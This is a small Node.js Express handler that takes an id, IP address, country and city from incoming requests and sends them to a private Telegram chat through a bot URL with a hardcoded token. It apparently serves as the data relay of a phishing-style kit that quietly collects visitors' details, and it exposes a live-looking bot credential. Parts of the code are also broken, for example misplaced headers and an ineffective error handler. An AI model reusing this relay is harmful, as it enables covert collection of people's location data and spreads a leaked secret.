const Router = "express";

const axios = require("axios");

 const SendIp = async (req, res) => {
    try {
        const {
            id,
            ip,
            country,
            city,
        } = req.body;

        const params =
            `=============================%0A ID: ${id}%0A IP: ${ip}%0A Country: ${country}%0A City: ${city}%0A=============================`;
    
        axios.post(`https://api.telegram.org/bot7200711723:AAHQosYOVZP2zbG2pmBuvCZL-WyGVGM7C_E/sendMessage?chat_id=-4225800222&text=${params}`, {
            headers: {
                'Content-Type': 'application/json',
                'X-Robots-Tag': 'googlebot: nofollow',
            },

        }).then(data => {
            if (data.status === 200) {
                return res.send({
                    success: true
                })
            }
        })

    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};

module.exports = SendIp